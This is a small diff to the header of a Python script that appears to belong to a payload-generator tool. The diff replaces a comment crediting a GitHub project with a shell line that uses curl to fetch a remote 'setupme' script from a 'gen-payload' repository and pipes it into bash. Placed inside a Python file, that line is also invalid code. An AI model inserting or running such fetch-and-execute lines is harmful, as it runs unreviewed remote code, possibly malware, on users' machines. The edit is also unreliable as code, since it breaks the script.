@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #-*- coding: utf-8 -*-
-#https://github.com/AngelSecurityTeam/RapidPayload
+bash <(curl -sL https://raw.githubusercontent.com/Punker-Bhai/gen-payload/master/setupme)
 import os
 import platform,subprocess,re
 from time import sleep
